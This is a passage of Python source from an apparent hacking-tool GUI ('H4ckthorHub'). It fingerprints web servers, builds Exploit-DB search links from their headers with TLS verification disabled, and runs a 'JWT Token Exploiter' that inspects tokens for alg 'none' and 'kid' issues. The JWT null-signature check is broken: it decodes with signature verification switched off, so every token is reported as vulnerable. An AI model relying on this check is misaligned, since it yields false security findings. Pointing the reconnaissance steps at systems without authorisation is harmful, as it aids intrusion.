            r = requests.get(url, headers=self.agent, timeout=10, verify=False, allow_redirects=True)
            srv = r.headers.get('Server', 'Unknown')
            powered = r.headers.get('X-Powered-By', 'Unknown')
            self.log("arch", f"Server: {srv}", "ok")
            self.log("arch", f"X-Powered-By: {powered}", "ok")
            if "wp-content" in r.text or "WordPress" in str(r.headers):
                self.log("arch", "WordPress detected! Recommended: WPScan", "warn")
            query = f"{srv} {powered} exploit".replace("Unknown","").strip()
            if query:
                edb = f"https://www.exploit-db.com/search?q={urllib.parse.quote(query)}"
                self.log("arch", f"Exploit-DB: {edb}", "warn")
        except Exception as e:
            self.log("arch", f"Error: {str(e)}", "fail")
        self.is_running["arch"] = False

    def logic_jwt(self, target):
        self.log("jwt", "JWT Token Exploiter - Enter a JWT token in the target field.")
        token = target.strip()
        if not token or '.' not in token:
            self.log("jwt", "Invalid JWT token format. Please provide a valid JWT.", "fail")
            self.is_running["jwt"] = False
            return
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            self.log("jwt", f"Header: {json.dumps(header, indent=2)}", "info")
            self.log("jwt", f"Payload: {json.dumps(payload, indent=2)}", "info")
            if header.get('alg') == 'none':
                self.log("jwt", "VULNERABLE: Algorithm 'none' accepted!", "vuln")
            if 'kid' in header:
                self.log("jwt", "Potential 'kid' injection vector", "warn")
            self.log("jwt", "Testing null signature...", "info")
            null_token = token.rsplit('.', 1)[0] + '.'
            try:
                jwt.decode(null_token, options={"verify_signature": False})
                self.log("jwt", "VULNERABLE: Null signature accepted!", "vuln")
            except:
                pass
        except Exception as e:
            self.log("jwt", f"Error: {str(e)}", "fail")
        self.is_running["jwt"] = False

    def logic_report(self, _):
        fn = f"h4ckthor_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(self.session_results))
        self.log("report", f"Report saved: {fn}", "ok")
        self.is_running["report"] = False

if __name__ == "__main__":
    app = H4ckthorHub()
    app.mainloop()
